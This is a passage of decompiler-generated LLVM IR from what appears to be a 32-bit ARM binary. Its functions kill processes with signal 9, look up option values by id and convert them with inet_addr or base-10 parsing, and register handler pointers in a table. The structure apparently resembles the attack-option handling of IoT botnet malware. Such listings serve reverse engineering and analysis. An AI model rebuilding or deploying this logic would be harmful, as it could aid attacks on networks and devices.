  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.79 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 4, 0, 5, 3, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_b030, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_ae54, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_b084(i32 %arg1) local_unnamed_addr {
dec_label_pc_b084:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b084 = load i32, i32* @r4, align 4
  store i32 %v3_b084, i32* %stack_var_-12, align 4
  %v6_b084 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1cd38.116 to i32), i32* @r4, align 4
  %v2_b08c = load i32, i32* @global_var_1cd38.116, align 4
  %v2_b090 = icmp eq i32 %v2_b08c, 0
  br i1 %v2_b090, label %dec_label_pc_b098, label %dec_label_pc_b118

dec_label_pc_b098:                                ; preds = %dec_label_pc_b084
  %v3_b098 = load i32, i32* @global_var_1cd3c.117, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b0a0 = icmp eq i32 %v3_b098, 0
  store i32 0, i32* @global_var_1cd38.116, align 4
  br i1 %v2_b0a0, label %dec_label_pc_b0ac, label %dec_label_pc_b134

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, %dec_label_pc_b098
  %v0_b0b4 = phi i32 [ %v0_b0b4.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ 0, %dec_label_pc_b098 ]
  %v1_b0b4 = phi i32 [ %v0_b0ac.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ ptrtoint (i32* @global_var_1cd38.116 to i32), %dec_label_pc_b098 ]
  %v1_b0ac = add i32 %v1_b0b4, 8
  %v2_b0ac = inttoptr i32 %v1_b0ac to i32*
  %v3_b0ac = load i32, i32* %v2_b0ac, align 4
  %v2_b0b0 = icmp eq i32 %v3_b0ac, 0
  %v2_b0b4 = add i32 %v1_b0b4, 4
  %v3_b0b4 = inttoptr i32 %v2_b0b4 to i32*
  store i32 %v0_b0b4, i32* %v3_b0b4, align 4
  br i1 %v2_b0b0, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v0_b0bc = load i32, i32* @r4, align 4
  %v1_b0bc = add i32 %v0_b0bc, 12
  %v2_b0bc = inttoptr i32 %v1_b0bc to i32*
  %v3_b0bc = load i32, i32* %v2_b0bc, align 4
  %v2_b0c0 = icmp eq i32 %v3_b0bc, 0
  %v0_b0c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0c4 = add i32 %v0_b0bc, 8
  %v3_b0c4 = inttoptr i32 %v2_b0c4 to i32*
  store i32 %v0_b0c4, i32* %v3_b0c4, align 4
  br i1 %v2_b0c0, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b0cc:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v0_b0cc = load i32, i32* @r4, align 4
  %v1_b0cc = add i32 %v0_b0cc, 16
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  %v3_b0cc = load i32, i32* %v2_b0cc, align 4
  %v2_b0d0 = icmp eq i32 %v3_b0cc, 0
  %v0_b0d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0d4 = add i32 %v0_b0cc, 12
  %v3_b0d4 = inttoptr i32 %v2_b0d4 to i32*
  store i32 %v0_b0d4, i32* %v3_b0d4, align 4
  br i1 %v2_b0d0, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v0_b0dc = load i32, i32* @r4, align 4
  %v1_b0dc = add i32 %v0_b0dc, 20
  %v2_b0dc = inttoptr i32 %v1_b0dc to i32*
  %v3_b0dc = load i32, i32* %v2_b0dc, align 4
  %v2_b0e0 = icmp eq i32 %v3_b0dc, 0
  %v0_b0e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0e4 = add i32 %v0_b0dc, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  store i32 %v0_b0e4, i32* %v3_b0e4, align 4
  br i1 %v2_b0e0, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b0ec:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v0_b0ec = load i32, i32* @r4, align 4
  %v1_b0ec = add i32 %v0_b0ec, 24
  %v2_b0ec = inttoptr i32 %v1_b0ec to i32*
  %v3_b0ec = load i32, i32* %v2_b0ec, align 4
  %v2_b0f0 = icmp eq i32 %v3_b0ec, 0
  %v0_b0f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0f4 = add i32 %v0_b0ec, 20
  %v3_b0f4 = inttoptr i32 %v2_b0f4 to i32*
  store i32 %v0_b0f4, i32* %v3_b0f4, align 4
  br i1 %v2_b0f0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b0fc:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v0_b0fc = load i32, i32* @r4, align 4
  %v1_b0fc = add i32 %v0_b0fc, 28
  %v2_b0fc = inttoptr i32 %v1_b0fc to i32*
  %v3_b0fc = load i32, i32* %v2_b0fc, align 4
  %v2_b100 = icmp eq i32 %v3_b0fc, 0
  %v0_b104 = load i32, i32* %r5.global-to-local, align 4
  %v2_b104 = add i32 %v0_b0fc, 24
  %v3_b104 = inttoptr i32 %v2_b104 to i32*
  store i32 %v0_b104, i32* %v3_b104, align 4
  br i1 %v2_b100, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac, %dec_label_pc_b1c4
  %v0_b10c = load i32, i32* %r5.global-to-local, align 4
  %v1_b10c = load i32, i32* @r4, align 4
  %v2_b10c = add i32 %v1_b10c, 28
  %v3_b10c = inttoptr i32 %v2_b10c to i32*
  store i32 %v0_b10c, i32* %v3_b10c, align 4
  %v2_b110 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b110, i32* @r4, align 4
  store i32 %v6_b084, i32* @r5, align 4
  %v0_b114 = call i32 @function_11694()
  br label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b084, %dec_label_pc_b10c
  %v2_b11c = call i32 @kill(i32 9, i32 9)
  %v0_b120 = load i32, i32* @r4, align 4
  %v1_b120 = add i32 %v0_b120, 4
  %v2_b120 = inttoptr i32 %v1_b120 to i32*
  %v3_b120 = load i32, i32* %v2_b120, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b128 = icmp eq i32 %v3_b120, 0
  %v2_b12c = inttoptr i32 %v0_b120 to i32*
  store i32 0, i32* %v2_b12c, align 4
  br i1 %v2_b128, label %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, label %dec_label_pc_b134

dec_label_pc_b118.dec_label_pc_b0ac_crit_edge:    ; preds = %dec_label_pc_b118
  %v0_b0ac.pre = load i32, i32* @r4, align 4
  %v0_b0b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b0ac

dec_label_pc_b134:                                ; preds = %dec_label_pc_b098, %dec_label_pc_b118
  %v2_b138 = call i32 @kill(i32 9, i32 9)
  %v0_b13c = load i32, i32* @r4, align 4
  %v1_b13c = add i32 %v0_b13c, 8
  %v2_b13c = inttoptr i32 %v1_b13c to i32*
  %v3_b13c = load i32, i32* %v2_b13c, align 4
  %v2_b140 = icmp eq i32 %v3_b13c, 0
  %v0_b144 = load i32, i32* %r5.global-to-local, align 4
  %v2_b144 = add i32 %v0_b13c, 4
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v0_b144, i32* %v3_b144, align 4
  br i1 %v2_b140, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v2_b150 = call i32 @kill(i32 9, i32 9)
  %v0_b154 = load i32, i32* @r4, align 4
  %v1_b154 = add i32 %v0_b154, 12
  %v2_b154 = inttoptr i32 %v1_b154 to i32*
  %v3_b154 = load i32, i32* %v2_b154, align 4
  %v2_b158 = icmp eq i32 %v3_b154, 0
  %v0_b15c = load i32, i32* %r5.global-to-local, align 4
  %v2_b15c = add i32 %v0_b154, 8
  %v3_b15c = inttoptr i32 %v2_b15c to i32*
  store i32 %v0_b15c, i32* %v3_b15c, align 4
  br i1 %v2_b158, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v2_b168 = call i32 @kill(i32 9, i32 9)
  %v0_b16c = load i32, i32* @r4, align 4
  %v1_b16c = add i32 %v0_b16c, 16
  %v2_b16c = inttoptr i32 %v1_b16c to i32*
  %v3_b16c = load i32, i32* %v2_b16c, align 4
  %v2_b170 = icmp eq i32 %v3_b16c, 0
  %v0_b174 = load i32, i32* %r5.global-to-local, align 4
  %v2_b174 = add i32 %v0_b16c, 12
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  store i32 %v0_b174, i32* %v3_b174, align 4
  br i1 %v2_b170, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v2_b180 = call i32 @kill(i32 9, i32 9)
  %v0_b184 = load i32, i32* @r4, align 4
  %v1_b184 = add i32 %v0_b184, 20
  %v2_b184 = inttoptr i32 %v1_b184 to i32*
  %v3_b184 = load i32, i32* %v2_b184, align 4
  %v2_b188 = icmp eq i32 %v3_b184, 0
  %v0_b18c = load i32, i32* %r5.global-to-local, align 4
  %v2_b18c = add i32 %v0_b184, 16
  %v3_b18c = inttoptr i32 %v2_b18c to i32*
  store i32 %v0_b18c, i32* %v3_b18c, align 4
  br i1 %v2_b188, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b194:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v2_b198 = call i32 @kill(i32 9, i32 9)
  %v0_b19c = load i32, i32* @r4, align 4
  %v1_b19c = add i32 %v0_b19c, 24
  %v2_b19c = inttoptr i32 %v1_b19c to i32*
  %v3_b19c = load i32, i32* %v2_b19c, align 4
  %v2_b1a0 = icmp eq i32 %v3_b19c, 0
  %v0_b1a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b1a4 = add i32 %v0_b19c, 20
  %v3_b1a4 = inttoptr i32 %v2_b1a4 to i32*
  store i32 %v0_b1a4, i32* %v3_b1a4, align 4
  br i1 %v2_b1a0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v2_b1b0 = call i32 @kill(i32 9, i32 9)
  %v0_b1b4 = load i32, i32* @r4, align 4
  %v1_b1b4 = add i32 %v0_b1b4, 28
  %v2_b1b4 = inttoptr i32 %v1_b1b4 to i32*
  %v3_b1b4 = load i32, i32* %v2_b1b4, align 4
  %v2_b1b8 = icmp eq i32 %v3_b1b4, 0
  %v0_b1bc = load i32, i32* %r5.global-to-local, align 4
  %v2_b1bc = add i32 %v0_b1b4, 24
  %v3_b1bc = inttoptr i32 %v2_b1bc to i32*
  store i32 %v0_b1bc, i32* %v3_b1bc, align 4
  br i1 %v2_b1b8, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac
  %v2_b1c8 = call i32 @kill(i32 9, i32 9)
  br label %dec_label_pc_b10c

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 11, 12, 13, 2, 3, 4, 0, 1, 7, 5, 6, 8, 9, 10, 14 }
  uselistorder i32 20, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10 }
  uselistorder label %dec_label_pc_b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b194, { 1, 0 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
  uselistorder label %dec_label_pc_b164, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 1, 0 }
  uselistorder label %dec_label_pc_b134, { 1, 0 }
  uselistorder label %dec_label_pc_b118, { 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_b0ec, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0cc, { 1, 0 }
  uselistorder label %dec_label_pc_b0bc, { 1, 0 }
}

define i32 @function_b1d4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_b1d4:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b1d4 = urem i32 %arg1, 256
  %v2_b1d8 = icmp eq i32 %v1_b1d4, 0
  br i1 %v2_b1d8, label %dec_label_pc_b224, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1d4
  %v0_b1e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1e8 = add i32 %v0_b1e8, 4
  %v2_b1e8 = inttoptr i32 %v1_b1e8 to i8*
  %v3_b1e8 = load i8, i8* %v2_b1e8, align 1
  %v4_b1e8 = zext i8 %v3_b1e8 to i32
  %v1_b1ec = urem i32 %arg3, 256
  %v9_b1f0 = icmp eq i32 %v4_b1e8, %v1_b1ec
  br i1 %v9_b1f0, label %dec_label_pc_b22c, label %dec_label_pc_b214.preheader

dec_label_pc_b214.preheader:                      ; preds = %dec_label_pc_b1e8
  br label %dec_label_pc_b214

dec_label_pc_b204:                                ; preds = %dec_label_pc_b214
  %v1_b204 = add i32 %v0_b20c.in, 12
  %v2_b204 = inttoptr i32 %v1_b204 to i8*
  %v3_b204 = load i8, i8* %v2_b204, align 1
  %v4_b204 = zext i8 %v3_b204 to i32
  %v9_b208 = icmp eq i32 %v1_b1ec, %v4_b204
  br i1 %v9_b208, label %dec_label_pc_b22c, label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b214.preheader, %dec_label_pc_b204
  %v0_b20c.in = phi i32 [ %v0_b1e8, %dec_label_pc_b214.preheader ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v0_b214 = phi i32 [ 0, %dec_label_pc_b214.preheader ], [ %v1_b214, %dec_label_pc_b204 ]
  %v0_b20c = add i32 %v0_b20c.in, 8
  %v1_b214 = add i32 %v0_b214, 1
  %v9_b218 = icmp eq i32 %v1_b1d4, %v1_b214
  store i32 %v0_b20c, i32* %r1.global-to-local, align 4
  br i1 %v9_b218, label %dec_label_pc_b224, label %dec_label_pc_b204

dec_label_pc_b224:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b22c, %dec_label_pc_b1d4
  ret i32 %arg4

dec_label_pc_b22c:                                ; preds = %dec_label_pc_b204, %dec_label_pc_b1e8
  %v0_b22c = phi i32 [ %v0_b1e8, %dec_label_pc_b1e8 ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v1_b22c = inttoptr i32 %v0_b22c to i32*
  %v2_b22c = load i32, i32* %v1_b22c, align 4
  %v3_b230 = icmp eq i32 %v2_b22c, 0
  br i1 %v3_b230, label %dec_label_pc_b224, label %dec_label_pc_b238

dec_label_pc_b238:                                ; preds = %dec_label_pc_b22c
  %v3_b22c = inttoptr i32 %v2_b22c to i8*
  %v3_b23c = call i32 @inet_addr(i8* %v3_b22c)
  ret i32 %v3_b23c

; uselistorder directives
  uselistorder i32 %v2_b22c, { 1, 0 }
  uselistorder i32 %v1_b214, { 1, 0 }
  uselistorder i32 %v0_b20c, { 1, 0, 2 }
  uselistorder i32 %v0_b20c.in, { 1, 0 }
  uselistorder i32 %v1_b1ec, { 1, 0 }
  uselistorder i32 %v0_b1e8, { 1, 0, 2 }
  uselistorder i32 %v1_b1d4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b224, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
}

define i32 @function_b240(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b240:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b240 = urem i32 %arg1, 256
  %v2_b244 = icmp eq i32 %v1_b240, 0
  %v3_b248 = load i32, i32* @r4, align 4
  br i1 %v2_b244, label %dec_label_pc_b290, label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b240
  %v0_b254 = load i32, i32* %r1.global-to-local, align 4
  %v1_b254 = add i32 %v0_b254, 4
  %v2_b254 = inttoptr i32 %v1_b254 to i8*
  %v3_b254 = load i8, i8* %v2_b254, align 1
  %v4_b254 = zext i8 %v3_b254 to i32
  %v1_b258 = urem i32 %arg3, 256
  %v9_b25c = icmp eq i32 %v4_b254, %v1_b258
  br i1 %v9_b25c, label %dec_label_pc_b298, label %dec_label_pc_b280.preheader

dec_label_pc_b280.preheader:                      ; preds = %dec_label_pc_b254
  br label %dec_label_pc_b280

dec_label_pc_b270:                                ; preds = %dec_label_pc_b280
  %v1_b270 = add i32 %v0_b278.in, 12
  %v2_b270 = inttoptr i32 %v1_b270 to i8*
  %v3_b270 = load i8, i8* %v2_b270, align 1
  %v4_b270 = zext i8 %v3_b270 to i32
  %v9_b274 = icmp eq i32 %v1_b258, %v4_b270
  br i1 %v9_b274, label %dec_label_pc_b298, label %dec_label_pc_b280

dec_label_pc_b280:                                ; preds = %dec_label_pc_b280.preheader, %dec_label_pc_b270
  %v0_b278.in = phi i32 [ %v0_b254, %dec_label_pc_b280.preheader ], [ %v0_b278, %dec_label_pc_b270 ]
  %v0_b280 = phi i32 [ 0, %dec_label_pc_b280.preheader ], [ %v1_b280, %dec_label_pc_b270 ]
  %v0_b278 = add i32 %v0_b278.in, 8
  %v1_b280 = add i32 %v0_b280, 1
  store i32 %v1_b280, i32* @lr, align 4
  %v9_b284 = icmp eq i32 %v1_b240, %v1_b280
  store i32 %v0_b278, i32* %r1.global-to-local, align 4
  br i1 %v9_b284, label %dec_label_pc_b290, label %dec_label_pc_b270

dec_label_pc_b290:                                ; preds = %dec_label_pc_b280, %dec_label_pc_b298, %dec_label_pc_b240
  store i32 %v3_b248, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_b298:                                ; preds = %dec_label_pc_b270, %dec_label_pc_b254
  %v0_b298 = phi i32 [ %v0_b254, %dec_label_pc_b254 ], [ %v0_b278, %dec_label_pc_b270 ]
  %v1_b298 = inttoptr i32 %v0_b298 to i32*
  %v2_b298 = load i32, i32* %v1_b298, align 4
  %v2_b29c = icmp eq i32 %v2_b298, 0
  br i1 %v2_b29c, label %dec_label_pc_b290, label %dec_label_pc_b2a4

dec_label_pc_b2a4:                                ; preds = %dec_label_pc_b298
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_b248, i32* @r4, align 4
  %v2_b2ac = inttoptr i32 %v2_b298 to i8*
  %v3_b2ac = call i32 @function_13b34(i8* %v2_b2ac, i32 10)
  ret i32 %v3_b2ac

; uselistorder directives
  uselistorder i32 %v1_b280, { 1, 2, 0 }
  uselistorder i32 %v0_b278, { 1, 0, 2 }
  uselistorder i32 %v0_b278.in, { 1, 0 }
  uselistorder i32 %v1_b258, { 1, 0 }
  uselistorder i32 %v0_b254, { 1, 0, 2 }
  uselistorder i32 %v3_b248, { 1, 0 }
  uselistorder i32 %v1_b240, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b290, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
}

define i32 @function_b2b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_b2b0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b2b0 = load i32, i32* @r4, align 4
  store i32 %v3_b2b0, i32* %stack_var_-20, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b2bc = call i32* @calloc(i32 1, i32 8)
  %v3_b2bc = ptrtoint i32* %v2_b2bc to i32
  store i32 ptrtoint (i8** @global_var_1cd30.110 to i32), i32* %r4.global-to-local, align 4
  %v2_b2c4 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b2c4 = zext i8 %v2_b2c4 to i32
  store i32 ptrtoint (i32* @global_var_1cd34.112 to i32), i32* %r6.global-to-local, align 4
  store i32 56988, i32* %r2.global-to-local, align 4
  store i32 %v3_b2bc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b2d8 = mul nuw nsw i32 %v3_b2c4, 4
  store i32 %v3_b2d8, i32* %r1.global-to-local, align 4
  %v2_b2dc = load i32, i32* @global_var_1cd34.112, align 4
  store i32 56988, i32* %v2_b2bc, align 4
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = trunc i32 %v0_b2e4 to i8
  %v2_b2e4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b2e4 = add i32 %v2_b2e4, 4
  %v4_b2e4 = inttoptr i32 %v3_b2e4 to i8*
  store i8 %v1_b2e4, i8* %v4_b2e4, align 1
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 4
  store i32 %v1_b2e8, i32* %r1.global-to-local, align 4
  %v4_b2ec = inttoptr i32 %v2_b2dc to i32*
  %v5_b2ec = call i32* @realloc(i32* %v4_b2ec, i32 %v1_b2e8)
  %v7_b2ec = ptrtoint i32* %v5_b2ec to i32
  %v2_b2f0 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b2f0 = zext i8 %v2_b2f0 to i32
  store i32 %v3_b2f0, i32* %r3.global-to-local, align 4
  store i32 %v7_b2ec, i32* %ip.global-to-local, align 4
  %v0_b2f8 = load i32, i32* %r5.global-to-local, align 4
  %v5_b2f8 = mul nuw nsw i32 %v3_b2f0, 4
  %v6_b2f8 = add i32 %v5_b2f8, %v7_b2ec
  %v7_b2f8 = inttoptr i32 %v6_b2f8 to i32*
  store i32 %v0_b2f8, i32* %v7_b2f8, align 4
  store i32 ptrtoint (i8* @global_var_1cd31.121 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b308 = load i32, i32* %r4.global-to-local, align 4
  %v3_b308 = inttoptr i32 %v2_b308 to i8*
  store i8 ptrtoint (i8* @global_var_1cd31.121 to i8), i8* %v3_b308, align 1
  %v0_b30c = load i32, i32* %ip.global-to-local, align 4
  %v1_b30c = load i32, i32* %r6.global-to-local, align 4
  %v2_b30c = inttoptr i32 %v1_b30c to i32*
  store i32 %v0_b30c, i32* %v2_b30c, align 4
  %v2_b310 = call i32* @calloc(i32 1, i32 8)
  %v3_b310 = ptrtoint i32* %v2_b310 to i32
  %v2_b314 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b314 = zext i8 %v2_b314 to i32
  store i32 ptrtoint (i32* @global_var_e528.123 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 %v3_b310, i32* %r5.global-to-local, align 4
  %v3_b324 = mul nuw nsw i32 %v3_b314, 4
  store i32 %v3_b324, i32* %r1.global-to-local, align 4
  %v2_b328 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_e528.123 to i32), i32* %v2_b310, align 4
  %v2_b330 = load i32, i32* %r5.global-to-local, align 4
  %v3_b330 = add i32 %v2_b330, 4
  %v4_b330 = inttoptr i32 %v3_b330 to i8*
  store i8 1, i8* %v4_b330, align 1
  %v0_b334 = load i32, i32* %r1.global-to-local, align 4
  %v1_b334 = add i32 %v0_b334, 4
  store i32 %v1_b334, i32* %r1.global-to-local, align 4
  %v3_b338 = inttoptr i32 %v2_b328 to i32*
  %v4_b338 = call i32* @realloc(i32* %v3_b338, i32 %v1_b334)
  %v6_b338 = ptrtoint i32* %v4_b338 to i32
  %v2_b33c = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b33c = zext i8 %v2_b33c to i32
  store i32 %v3_b33c, i32* %r3.global-to-local, align 4
  store i32 %v6_b338, i32* %ip.global-to-local, align 4
  %v0_b344 = load i32, i32* %r5.global-to-local, align 4
  %v5_b344 = mul nuw nsw i32 %v3_b33c, 4
  %v6_b344 = add i32 %v5_b344, %v6_b338
  %v7_b344 = inttoptr i32 %v6_b344 to i32*
  store i32 %v0_b344, i32* %v7_b344, align 4
  %v0_b348 = load i32, i32* %r3.global-to-local, align 4
  %v1_b348 = load i32, i32* %r7.global-to-local, align 4
  %v2_b348 = add i32 %v1_b348, %v0_b348
  store i32 %v2_b348, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b354 = load i32, i32* %ip.global-to-local, align 4
  %v1_b354 = load i32, i32* %r6.global-to-local, align 4
  %v2_b354 = inttoptr i32 %v1_b354 to i32*
  store i32 %v0_b354, i32* %v2_b354, align 4
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = inttoptr i32 %v2_b358 to i8*
  store i8 %v1_b358, i8* %v3_b358, align 1
  %v2_b35c = call i32* @calloc(i32 %v1_b348, i32 8)
  %v4_b35c = ptrtoint i32* %v2_b35c to i32
  %v2_b360 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b360 = zext i8 %v2_b360 to i32
  store i32 ptrtoint (i32* @global_var_e9ec.125 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b35c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b370 = mul nuw nsw i32 %v3_b360, 4
  store i32 %v3_b370, i32* %r1.global-to-local, align 4
  %v2_b374 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_e9ec.125 to i32), i32* %v2_b35c, align 4
  %v0_b37c = load i32, i32* %r3.global-to-local, align 4
  %v1_b37c = trunc i32 %v0_b37c to i8
  %v2_b37c = load i32, i32* %r5.global-to-local, align 4
  %v3_b37c = add i32 %v2_b37c, 4
  %v4_b37c = inttoptr i32 %v3_b37c to i8*
  store i8 %v1_b37c, i8* %v4_b37c, align 1
  %v0_b380 = load i32, i32* %r1.global-to-local, align 4
  %v1_b380 = add i32 %v0_b380, 4
  store i32 %v1_b380, i32* %r1.global-to-local, align 4
  %v4_b384 = inttoptr i32 %v2_b374 to i32*
  %v5_b384 = call i32* @realloc(i32* %v4_b384, i32 %v1_b380)
  %v7_b384 = ptrtoint i32* %v5_b384 to i32
  %v2_b388 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b388 = zext i8 %v2_b388 to i32
  store i32 %v3_b388, i32* %r3.global-to-local, align 4
  store i32 %v7_b384, i32* %ip.global-to-local, align 4
  %v0_b390 = load i32, i32* %r5.global-to-local, align 4
  %v5_b390 = mul nuw nsw i32 %v3_b388, 4
  %v6_b390 = add i32 %v5_b390, %v7_b384
  %v7_b390 = inttoptr i32 %v6_b390 to i32*
  store i32 %v0_b390, i32* %v7_b390, align 4
  %v0_b394 = load i32, i32* %r3.global-to-local, align 4
  %v1_b394 = load i32, i32* %r7.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, %v0_b394
  store i32 %v2_b394, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i32*
  store i32 %v0_b3a0, i32* %v2_b3a0, align 4
  %v0_b3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3a4 = trunc i32 %v0_b3a4 to i8
  %v2_b3a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a4 = inttoptr i32 %v2_b3a4 to i8*
  store i8 %v1_b3a4, i8* %v3_b3a4, align 1
  %v2_b3a8 = call i32* @calloc(i32 %v1_b394, i32 8)
  %v4_b3a8 = ptrtoint i32* %v2_b3a8 to i32
  %v2_b3ac = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b3ac = zext i8 %v2_b3ac to i32
  store i32 ptrtoint (i32* @global_var_dbb4.127 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b3a8, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
